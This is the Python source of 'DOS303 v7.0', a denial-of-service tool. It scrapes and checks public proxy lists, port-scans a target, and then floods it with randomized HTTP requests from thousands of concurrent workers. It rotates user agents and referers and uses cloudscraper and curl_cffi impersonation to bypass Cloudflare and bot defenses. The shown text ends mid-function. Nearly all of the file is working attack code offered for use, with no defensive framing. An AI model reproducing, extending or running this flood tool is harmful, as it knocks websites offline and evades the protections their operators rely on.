#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import asyncio
import socket
import json
import signal
import argparse
import logging
from urllib.parse import urlparse, urljoin
from functools import partial
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import multiprocessing as mp

# ============================================
# LIBRARIES
# ============================================
try:
    import aiohttp
    import psutil
    from fake_useragent import UserAgent
    import httpx
    from curl_cffi import requests as curl_requests
    import cloudscraper
    from colorama import Fore, Back, Style, init as colorama_init
    from tqdm import tqdm
    import requests
    import socks
except ImportError as e:
    print(f"Missing dependency: {e}. Please install: pip install aiohttp psutil fake-useragent httpx curl_cffi cloudscraper colorama tqdm requests pysocks")
    sys.exit(1)

colorama_init(autoreset=True)

# ============================================
# COLORED LOGGING
# ============================================
class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': Fore.CYAN,
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'CRITICAL': Fore.RED + Back.WHITE,
    }

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.levelname = f"{self.COLORS[levelname]}{levelname}{Style.RESET_ALL}"
        return super().format(record)

handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter('[%(asctime)s] %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
logger = logging.getLogger('DOS303')
logger.setLevel(logging.INFO)
logger.handlers.clear()
logger.addHandler(handler)

# ============================================
# BANNER
# ============================================
def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + """
╔═══════════════════════════════════════════════════════════════════╗
║     DOS303 v7.0 - OPTIMIZED ATTACK SEQUENCE                       ║
║      💀 Multi-Vector Bypass Engine                                ║
║    🔥 Auto-Calibrate → Proxy Analysis → Target → Attack           ║
║    🚀 MAXIMUM POWER for proxy scanning (all cores)                ║
║    ⚡ Ultra Speed (0.0005s delay)                                 ║
║    ☁️  cloudscraper | colorama | tqdm                             ║
║         🏆 Score: 10/10                                          ║
║    👑 Coded by: @iazmonmn                                        ║
║    📱 Telegram: https://t.me/iazmonmn                             ║
╚═══════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

# ============================================
# SMART DNS TARGETS
# ============================================
DNS_TARGETS = [
    ("1.1.1.1", 53),        # Cloudflare
    ("8.8.8.8", 53),        # Google
    ("10.202.10.202", 53),  # Shecan (Iran)
    ("9.9.9.9", 53),        # Quad9
    ("208.67.222.222", 53), # OpenDNS
]

# ============================================
# 30+ GITHUB PROXY SOURCES
# ============================================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/all.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx222/proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/alexilario/ProxyList/main/proxy-list.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/proxy_list.txt",
    "https://raw.githubusercontent.com/secure-ur-software/proxy-list/main/proxies.txt",
]

# ============================================
# USER-AGENT MANAGER
# ============================================
class UserAgentManager:
    def __init__(self):
        self.fake_ua = None
        self.fallback_agents = self._get_fallback_list()
        self._init_fake_ua()
        logger.info(f"Loaded {len(self.fallback_agents)} fallback User-Agents + fake-useragent")

    def _init_fake_ua(self):
        try:
            self.fake_ua = UserAgent()
            test = self.fake_ua.random
        except Exception as e:
            logger.warning(f"fake-useragent failed: {e}, using fallback only")
            self.fake_ua = None

    def _get_fallback_list(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
        ]

    def get_random(self):
        if self.fake_ua:
            try:
                return self.fake_ua.random
            except Exception:
                pass
        return random.choice(self.fallback_agents)

# ============================================
# HEADER MANAGER
# ============================================
class HeaderManager:
    def __init__(self):
        self.headers_template = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache'
        }
        self.referers = [
            'https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/',
            'https://duckduckgo.com/', 'https://www.facebook.com/', 'https://twitter.com/',
            'https://www.instagram.com/', 'https://www.linkedin.com/', 'https://www.youtube.com/',
            'https://www.reddit.com/', 'https://www.wikipedia.org/', 'https://github.com/',
        ]

    def get_headers(self, user_agent, target_url=None, method='GET'):
        headers = self.headers_template.copy()
        headers['User-Agent'] = user_agent
        headers['X-Powered-By'] = 'DOS303 v7.0'
        headers['X-Coded-By'] = 'https://t.me/iazmonmn'
        if target_url:
            parsed = urlparse(target_url)
            if parsed.netloc:
                headers['Referer'] = random.choice(self.referers)
        if random.random() > 0.5:
            headers['DNT'] = '1'
        langs = ['en-US,en;q=0.9', 'fa-IR,fa;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9', 'fr-FR,fr;q=0.9']
        if random.random() > 0.3:
            headers['Accept-Language'] = random.choice(langs)
        if method == 'POST':
            headers['Content-Type'] = random.choice(['application/x-www-form-urlencoded', 'application/json'])
        return headers

# ============================================
# SMART PROXY TESTER
# ============================================
def parse_proxy_line(line):
    line = line.strip()
    if not line:
        return None
    
    if '://' in line:
        parsed = urlparse(line)
        proxy_type = parsed.scheme
        netloc = parsed.netloc
        if not netloc and ':' in parsed.path:
            netloc = parsed.path
    else:
        if ':' in line:
            proxy_type = "http"
            netloc = line
        else:
            return None
    
    if ':' not in netloc:
        return None
    
    parts = netloc.split(':', 1)
    if len(parts) != 2:
        return None
    
    ip, port = parts[0].strip(), parts[1].strip()
    if not port.isdigit():
        return None
    
    proxy_type_map = {
        'http': 'http',
        'https': 'http',
        'socks5': 'socks5',
        'socks4': 'socks4',
        'socks4a': 'socks4',
        'socks': 'socks5'
    }
    
    return {"ip": ip, "port": int(port), "type": proxy_type_map.get(proxy_type, 'http')}


def test_proxy_with_dns(proxy):
    try:
        start = time.perf_counter()
        proxy_type = socks.SOCKS5 if proxy["type"] == "socks5" else socks.SOCKS4 if proxy["type"] == "socks4" else None
        
        if proxy_type is None:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                sock.connect((proxy['ip'], proxy['port']))
                sock.close()
                latency = (time.perf_counter() - start) * 1000
                return proxy, latency, True
            except:
                return proxy, 9999, False
        
        for dns_ip, dns_port in DNS_TARGETS:
            try:
                s = socks.socksocket()
                s.set_proxy(proxy_type, proxy['ip'], proxy['port'])
                s.settimeout(1.5)
                s.connect((dns_ip, dns_port))
                s.close()
                latency = (time.perf_counter() - start) * 1000
                return proxy, latency, True
            except:
                continue
        
        return proxy, 9999, False
    except:
        return proxy, 9999, False


def test_proxy_http(proxy):
    test_urls = [
        "http://neverssl.com",
        "http://example.com",
        "http://icanhazip.com",
    ]
    
    for url in test_urls:
        try:
            test_proxies = {
                "http": f"{proxy['type']}://{proxy['ip']}:{proxy['port']}",
                "https": f"{proxy['type']}://{proxy['ip']}:{proxy['port']}"
            }
            start = time.perf_counter()
            r = requests.get(url, proxies=test_proxies, timeout=2)
            if r.status_code == 200:
                http_latency = (time.perf_counter() - start) * 1000
                return http_latency
        except:
            continue
    return None


def fetch_proxies_from_sources(log_callback=None):
    def log(msg):
        if log_callback:
            log_callback(msg)
    
    all_proxies = []
    for url in tqdm(PROXY_SOURCES, desc="Fetching proxies", leave=False):
        try:
            resp = requests.get(url, timeout=15, headers={'User-Agent': 'Mozilla/5.0'})
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parsed = parse_proxy_line(line)
                    if parsed:
                        all_proxies.append(parsed)
        except Exception as e:
            log(f"Failed to load {url.split('/')[-1]}: {str(e)[:30]}")
    
    return all_proxies


def scan_proxies_smart(proxy_list, max_workers=None, log_callback=None):
    """اسکن هوشمند پروکسی با حداکثر توان"""
    def log(msg):
        if log_callback:
            log_callback(msg)
    
    if not proxy_list:
        return []
    
    if max_workers is None:
        max_workers = min(mp.cpu_count() * 4, 500)
    
    log(f"[*] Testing {len(proxy_list)} proxies with {max_workers} workers...")
    
    # مرحله ۱: تست DNS
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_proxy_with_dns, p): p for p in proxy_list}
        for future in tqdm(as_completed(futures), total=len(futures), desc="DNS Test", leave=False):
            proxy, latency, ok = future.result()
            if ok and latency < 1000:
                proxy['latency'] = latency
                results.append(proxy)
    
    log(f"[*] {len(results)} proxies passed DNS test. Testing HTTP...")
    
    # مرحله ۲: تست HTTP
    http_results = []
    for proxy in tqdm(results, desc="HTTP Test", leave=False):
        if proxy.get('latency', 9999) < 800:
            http_latency = test_proxy_http(proxy)
            if http_latency is not None:
                proxy['http_latency'] = http_latency
                http_results.append(proxy)
    
    http_results.sort(key=lambda x: (x.get('latency', 9999), x.get('http_latency', 9999)))
    
    log(f"[+] {len(http_results)} proxies fully verified")
    return http_results

# ============================================
# PROXY MANAGER
# ============================================
class ProxyManager:
    def __init__(self, max_proxies=2000):
        self.proxies = []
        self.lock = threading.Lock()
        self.index = 0
        self.max_proxies = max_proxies
        self.running = True
        self.background_thread = None
        self.refresh_interval = 30
        self.last_refresh = 0
    
    def log(self, msg):
        logger.info(msg)
    
    def load_proxies(self, max_workers=None):
        """بارگذاری پروکسی با حداکثر توان"""
        self.log("[*] Fetching proxies from 30+ sources with MAX POWER...")
        
        raw = fetch_proxies_from_sources(self.log)
        if not raw:
            self.log("[!] No raw proxies found, using fallback")
            self._fallback_proxies()
            return len(self.proxies)
        
        scanned = scan_proxies_smart(raw, max_workers, self.log)
        if not scanned:
            self.log("[!] No working proxies found, using fallback")
            self._fallback_proxies()
            return len(self.proxies)
        
        with self.lock:
            self.proxies = scanned[:self.max_proxies]
            self.log(f"[+] Proxy list loaded: {len(self.proxies)} active proxies")
            return len(self.proxies)
    
    def _fallback_proxies(self):
        fallback = [
            {'ip': '45.33.24.170', 'port': 8080, 'type': 'http', 'latency': 100},
            {'ip': '45.76.141.197', 'port': 8888, 'type': 'http', 'latency': 120},
            {'ip': '31.186.171.169', 'port': 8080, 'type': 'http', 'latency': 150},
            {'ip': '88.198.26.183', 'port': 3128, 'type': 'http', 'latency': 200},
            {'ip': '5.189.157.139', 'port': 8080, 'type': 'http', 'latency': 180},
            {'ip': '212.83.138.188', 'port': 8080, 'type': 'http', 'latency': 160},
        ]
        with self.lock:
            self.proxies = fallback
            self.log(f"[+] Using {len(self.proxies)} fallback proxies")
    
    def refresh_proxies_sync(self):
        """تازه‌سازی پروکسی در پس‌زمینه"""
        if time.time() - self.last_refresh < self.refresh_interval:
            return
        self.last_refresh = time.time()
        self.log("[*] Refreshing proxies in background...")
        
        # استفاده از workerهای کمتر برای پس‌زمینه
        raw = fetch_proxies_from_sources(self.log)
        if raw:
            scanned = scan_proxies_smart(raw, max_workers=50, log_callback=self.log)
            if scanned:
                with self.lock:
                    for p in scanned:
                        exists = False
                        for existing in self.proxies:
                            if existing['ip'] == p['ip'] and existing['port'] == p['port']:
                                exists = True
                                break
                        if not exists:
                            self.proxies.append(p)
                    if len(self.proxies) > self.max_proxies:
                        self.proxies = self.proxies[:self.max_proxies]
                    self.log(f"[+] Proxy refresh complete: {len(self.proxies)} active")
    
    def get_next_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy
    
    def get_proxy_count(self):
        with self.lock:
            return len(self.proxies)
    
    def mark_dead(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)
                self.log(f"[ProxyManager] Removed dead proxy: {proxy['ip']}:{proxy['port']}")
    
    def start_background_refresh(self):
        def refresh_loop():
            while self.running:
                time.sleep(self.refresh_interval)
                if self.running:
                    self.refresh_proxies_sync()
        
        self.background_thread = threading.Thread(target=refresh_loop, daemon=True)
        self.background_thread.start()
    
    def stop(self):
        self.running = False

# ============================================
# PATH MANAGER
# ============================================
class PathManager:
    def __init__(self):
        self.paths = []
        self._fallback_paths()
        logger.info(f"Loaded {len(self.paths)} paths")

    def _fallback_paths(self):
        base = [
            '/', '/index.php', '/index.html', '/home', '/about', '/contact',
            '/products', '/services', '/blog', '/news', '/events', '/gallery',
            '/login', '/register', '/signup', '/account', '/profile', '/settings',
            '/search', '/results', '/category', '/tag', '/author', '/page',
            '/post', '/article', '/download', '/upload', '/files', '/media',
            '/images', '/css', '/js', '/fonts', '/api', '/v1', '/v2', '/v3',
            '/admin', '/dashboard', '/panel', '/control', '/manage', '/system',
            '/config', '/settings', '/preferences', '/help', '/support', '/faq',
            '/terms', '/privacy', '/security', '/sitemap', '/robots.txt',
            '/catalog', '/shop', '/cart', '/checkout', '/wishlist', '/compare',
            '/feedback', '/testimonial', '/portfolio', '/team', '/careers',
            '/jobs', '/apply', '/resume', '/downloads', '/updates', '/changelog',
            '/docs', '/documentation', '/wiki', '/knowledge-base', '/tutorials',
            '/guides', '/manual', '/user-guide', '/installation', '/setup',
            '/configuration', '/customization', '/integration', '/api-docs',
            '/reference', '/examples', '/demo', '/sandbox', '/test', '/dev',
            '/staging', '/production', '/deploy', '/release', '/version',
            '/changelog', '/roadmap', '/community', '/forum', '/chat',
            '/discord', '/slack', '/telegram', '/whatsapp', '/support',
            '/contact-us', '/location', '/hours', '/holidays', '/events',
            '/webinars', '/podcast', '/youtube', '/instagram', '/facebook',
            '/twitter', '/linkedin', '/github', '/gitlab', '/bitbucket',
            '/source', '/repository', '/issues', '/pull-requests', '/commits'
        ]
        generated = []
        for i in range(1, 201):
            generated.extend([
                f'/page_{i}', f'/article_{i}', f'/post_{i}', f'/item_{i}',
                f'/product_{i}', f'/category_{i}', f'/tag_{i}', f'/user_{i}',
                f'/profile_{i}', f'/settings_{i}', f'/blog_{i}', f'/news_{i}'
            ])
        self.paths = list(set(base + generated))

    def get_random_path(self, base_url, include_params=True):
        path = random.choice(self.paths)
        if include_params and random.random() > 0.3:
            params = []
            for i in range(random.randint(1, 3)):
                key = f"param{i}"
                value = random.randint(1000, 999999)
                params.append(f"{key}={value}")
            if params:
                path += "?" + "&".join(params)
        return urljoin(base_url, path.lstrip('/'))

# ============================================
# SYSTEM ANALYZER
# ============================================
class SystemAnalyzer:
    def __init__(self):
        self.level_names = {
            0: "کاملاً ذغالی 💀", 1: "ذغالی 🤡", 2: "ضعیف 🥱",
            3: "بد 😴", 4: "معمولی 😐", 5: "خوب 👍",
            6: "قوی 💪", 7: "الترا قوی ⚡", 8: "فوق‌العاده 🚀",
            9: "افسانه‌ای 🔥"
        }

    async def analyze(self):
        logger.info("⚡ Auto-calibrating system (60s)...")
        try:
            cpu_cores = psutil.cpu_count(logical=True)
            ram_total = psutil.virtual_memory().total / (1024**3)

            cpu_percents = []
            ram_available = []

            for i in tqdm(range(60), desc="Calibrating", unit="s"):
                cpu_percents.append(psutil.cpu_percent(interval=None))
                ram_available.append(psutil.virtual_memory().available / (1024**3))
                if i % 10 == 0:
                    logger.info(f"   ⏳ Calibrating... {i+1}/60s")
                await asyncio.sleep(0.5)

            avg_cpu = sum(cpu_percents) / len(cpu_percents)
            avg_ram_available = sum(ram_available) / len(ram_available)
            ram_used = ram_total - avg_ram_available

            cpu_factor = 1 + (0.5 - avg_cpu/100)
            ram_factor = 1 + (0.5 - ram_used/ram_total) if ram_total > 0 else 1

            cpu_score = min(100, (cpu_cores * 8) * cpu_factor)
            ram_score = min(100, (ram_total * 8) * ram_factor)
            total_score = (cpu_score * 0.7) + (ram_score * 0.3)

            level = self._get_level(total_score)
            logger.info(f"   ✅ Calibration complete! Avg CPU: {avg_cpu:.1f}%, RAM used: {ram_used:.1f}GB")

            return {
                'level': level,
                'level_name': self.level_names[level],
                'cpu_cores': cpu_cores,
                'ram_gb': round(ram_total, 1),
                'workers': self._get_workers(level, cpu_cores),
                'connections': self._get_connections(level),
                'packet_rate': self._get_packet_rate(level),
                'proxy_workers': min(cpu_cores * 8, 500)  # حداکثر توان برای اسکن پروکسی
            }
        except Exception as e:
            logger.error(f"Calibration failed: {e}")
            return {'level': 4, 'level_name': "معمولی 😐", 'workers': 200, 'connections': 800, 'packet_rate': 1200, 'proxy_workers': 100}

    def _get_level(self, score):
        if score >= 95: return 9
        elif score >= 85: return 8
        elif score >= 75: return 7
        elif score >= 65: return 6
        elif score >= 55: return 5
        elif score >= 45: return 4
        elif score >= 35: return 3
        elif score >= 25: return 2
        elif score >= 15: return 1
        else: return 0

    def _get_workers(self, level, cpu_cores):
        base = [10, 25, 50, 100, 200, 400, 800, 1600, 3200, 6400][level]
        return min(2000, base * max(1, cpu_cores // 2))

    def _get_connections(self, level):
        return min(5000, [50, 100, 200, 400, 800, 1600, 3200, 6400, 12800, 25600][level])

    def _get_packet_rate(self, level):
        rates = [100, 300, 500, 800, 1200, 2000, 3000, 5000, 8000, 12000]
        return rates[level]

# ============================================
# PORT SCANNER & TARGET ANALYZER
# ============================================
class PortScanner:
    @staticmethod
    async def scan(host, ports=None, timeout=2):
        if ports is None:
            ports = [80, 443, 8080, 8443, 8000, 81, 88, 3000, 5000, 5432, 3306, 4443, 9000]
        tasks = []
        for port in ports:
            tasks.append(PortScanner._check_port(host, port, timeout))
        results = await asyncio.gather(*tasks)
        return [port for port, is_open in results if is_open]
    
    @staticmethod
    async def _check_port(host, port, timeout):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return port, True
        except:
            return port, False

class TargetAnalyzer:
    @staticmethod
    async def analyze(target_url, proxy_manager=None):
        """تحلیل کامل هدف: port scan + initial response"""
        logger.info(f"🔍 Analyzing target: {target_url}")
        parsed = urlparse(target_url)
        host = parsed.hostname
        original_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        # Port scan
        open_ports = await PortScanner.scan(host)
        if open_ports:
            logger.info(f"   ✅ Open ports found: {open_ports}")
            if 80 in open_ports:
                port = 80
            elif 443 in open_ports:
                port = 443
            else:
                port = open_ports[0]
        else:
            logger.warning("   ❌ No open ports found, using default port 80")
            port = 80
        
        # Build final target
        final_target = f"{parsed.scheme}://{host}:{port}"
        logger.info(f"   💡 Selected target: {final_target}")
        
        # Initial HTTP response (optional)
        try:
            proxy = proxy_manager.get_next_proxy() if proxy_manager else None
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(final_target, proxy=proxy, timeout=10) as resp:
                    logger.info(f"   ✅ Target responded with status: {resp.status}")
                    server = resp.headers.get('Server', 'Unknown')
                    logger.info(f"   🖥️  Server: {server}")
        except Exception as e:
            logger.warning(f"   ⚠️ Initial HTTP check failed: {e}")
        
        return {
            'host': host,
            'port': port,
            'target': final_target,
            'open_ports': open_ports
        }

# ============================================
# ATTACK MODULES
# ============================================

class HTTPFloodAttack:
    def __init__(self, target_url, workers, proxy_manager, user_agent_manager,
                 header_manager, path_manager, stop_event, args):
        self.target_url = target_url
        self.workers = min(workers, args.max_workers or 2000)
        self.requests_sent = 0
        self.lock = asyncio.Lock()
        self.proxy_manager = proxy_manager
        self.user_agent_manager = user_agent_manager
        self.header_manager = header_manager
        self.path_manager = path_manager
        self.stop_event = stop_event
        self.avg_response_time = 5.0
        self.args = args
        self.methods = ['GET', 'POST', 'HEAD']
        self.payload_sizes = [64, 128, 256, 512, 1024, 2048]
        self.consecutive_failures = 0
        self.direct_mode = False

        connector = aiohttp.TCPConnector(
            ssl=False,
            limit=0,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )

        self.httpx_client = None
        if not args.no_httpx:
            try:
                limits = httpx.Limits(max_keepalive_connections=0, max_connections=0)
                self.httpx_client = httpx.AsyncClient(
                    http2=True,
                    timeout=httpx.Timeout(10.0, connect=5.0),
                    limits=limits,
                    verify=False
                )
                logger.info("httpx client initialized (HTTP/2 support)")
            except Exception as e:
                logger.warning(f"httpx init failed: {e}")
                self.httpx_client = None

        self.cloudscraper = None
        if not args.no_cloudscraper:
            try:
                self.cloudscraper = cloudscraper.create_scraper(
                    browser={
                        'browser': 'chrome',
                        'platform': 'windows',
                        'mobile': False
                    },
                    delay=1,
                    interpreter='native'
                )
                logger.info("cloudscraper initialized (Cloudflare bypass)")
            except Exception as e:
                logger.warning(f"cloudscraper init failed: {e}")
                self.cloudscraper = None

        self.curl_impersonate = not args.no_curl_cffi

    async def attack(self):
        logger.info(f"HTTP Flood (Bypass) - {self.workers} workers")
        logger.info("👑 Coded by: @iazmonmn - Telegram: https://t.me/iazmonmn")
        if self.httpx_client:
            logger.info("   ✅ httpx (HTTP/2) enabled")
        if self.cloudscraper:
            logger.info("   ✅ cloudscraper (Cloudflare) enabled")
        if self.curl_impersonate:
            logger.info("   ✅ curl_cffi impersonation enabled")
        tasks = []
        for i in range(self.workers):
            tasks.append(asyncio.create_task(self._worker()))
            if i % 100 == 0:
                await asyncio.sleep(0.001)
        tasks.append(asyncio.create_task(self._monitor()))
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            await self.session.close()
            if self.httpx_client:
                await self.httpx_client.aclose()

    async def _worker(self):
        while not self.stop_event.is_set():
            proxy = None
            try:
                if self.args.no_proxy:
                    proxy = None
                else:
                    proxy = self.proxy_manager.get_next_proxy() if self.proxy_manager else None
                    if proxy is None:
                        self.consecutive_failures += 1
                        if self.consecutive_failures > 5:
                            if not self.direct_mode:
                                logger.warning("⚡ Switching to direct mode (no proxy)")
                                self.direct_mode = True
                            proxy = None
                            self.consecutive_failures = 0
                        else:
                            await asyncio.sleep(0.1)
                            continue
                    else:
                        self.consecutive_failures = 0
                        if self.direct_mode:
                            logger.info("✅ Proxy available, exiting direct mode")
                            self.direct_mode = False

                user_agent = self.user_agent_manager.get_random()
                method = random.choice(self.methods)
                headers = self.header_manager.get_headers(user_agent, self.target_url, method)
                url = self.path_manager.get_random_path(self.target_url, include_params=True)

                if random.random() < 0.1:
                    static_ext = ['.css', '.js', '.png', '.jpg', '.ico', '.woff2']
                    url = urljoin(self.target_url, f"/static/{random.randint(1000,9999)}{random.choice(static_ext)}")

                start_time = time.time()
                transport = random.random()

                try:
                    if transport < 0.6:
                        if method == 'GET':
                            async with self.session.get(url, headers=headers, proxy=proxy,
                                                        timeout=aiohttp.ClientTimeout(total=10)) as response:
                                await response.read()
                        elif method == 'POST':
                            if headers.get('Content-Type') == 'application/json':
                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
                            else:
                                payload = "x=" + "x" * random.choice(self.payload_sizes)
                            async with self.session.post(url, data=payload, headers=headers, proxy=proxy,
                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
                                await response.read()
                        else:
                            async with self.session.head(url, headers=headers, proxy=proxy,
                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
                                await response.read()

                    elif transport < 0.8 and self.httpx_client:
                        proxies = {"http://": proxy, "https://": proxy} if proxy else None
                        if method == 'GET':
                            resp = await self.httpx_client.get(url, headers=headers, proxy=proxies)
                        elif method == 'POST':
                            if headers.get('Content-Type') == 'application/json':
                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
                            else:
                                payload = "x=" + "x" * random.choice(self.payload_sizes)
                            resp = await self.httpx_client.post(url, data=payload, headers=headers, proxy=proxies)
                        else:
                            resp = await self.httpx_client.head(url, headers=headers, proxy=proxies)
                        resp.read()

                    elif transport < 0.9 and self.cloudscraper:
                        loop = asyncio.get_running_loop()
                        proxies = {"http": proxy, "https": proxy} if proxy else None
                        if method == 'GET':
                            await loop.run_in_executor(
                                None,
                                partial(self.cloudscraper.get, url, headers=headers, proxies=proxies, timeout=10)
                            )
                        elif method == 'POST':
                            if headers.get('Content-Type') == 'application/json':
                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
                            else:
                                payload = "x=" + "x" * random.choice(self.payload_sizes)
                            await loop.run_in_executor(
                                None,
                                partial(self.cloudscraper.post, url, data=payload, headers=headers, proxies=proxies, timeout=10)
                            )
                        else:
                            await loop.run_in_executor(
                                None,
                                partial(self.cloudscraper.head, url, headers=headers, proxies=proxies, timeout=10)
                            )

                    elif self.curl_impersonate:
                        loop = asyncio.get_running_loop()
                        proxies = {"http": proxy, "https": proxy} if proxy else None
                        impersonate = random.choice(["chrome", "firefox", "safari"])
                        if method == 'GET':
                            await loop.run_in_executor(
                                None,
                                partial(curl_requests.get, url, headers=headers, proxies=proxies, timeout=10, impersonate=impersonate)
                            )
                        elif method == 'POST':
                            if headers.get('Content-Type') == 'application/json':
                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
                            else:
                                payload = "x=" + "x" * random.choice(self.payload_sizes)
                            await loop.run_in_executor(
                                None,
                                partial(curl_requests.post, url, data=payload, headers=headers, proxies=proxies, timeout=10, impersonate=impersonate)
                            )
                        else:
                            await loop.run_in_executor(
                                None,
                                partial(curl_requests.head, url, headers=headers, proxies=proxies, timeout=10, impersonate=impersonate)
                            )

                    else:
                        if method == 'GET':
                            async with self.session.get(url, headers=headers, proxy=proxy,
                                                        timeout=aiohttp.ClientTimeout(total=10)) as response:
                                await response.read()
                        elif method == 'POST':
                            if headers.get('Content-Type') == 'application/json':
                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
                            else:
                                payload = "x=" + "x" * random.choice(self.payload_sizes)
                            async with self.session.post(url, data=payload, headers=headers, proxy=proxy,
                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
                                await response.read()
                        else:
                            async with self.session.head(url, headers=headers, proxy=proxy,
                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
                                await response.read()

                    async with self.lock:
                        self.requests_sent += 1
                    self.avg_response_time = self.avg_response_time * 0.9 + (time.time() - start_time) * 0.1

                except (ConnectionResetError, ConnectionAbortedError):
                    await asyncio.sleep(random.uniform(0.001, 0.003))
                    continue
                except Exception as e:
                    if proxy and not self.args.no_proxy and self.proxy_manager:
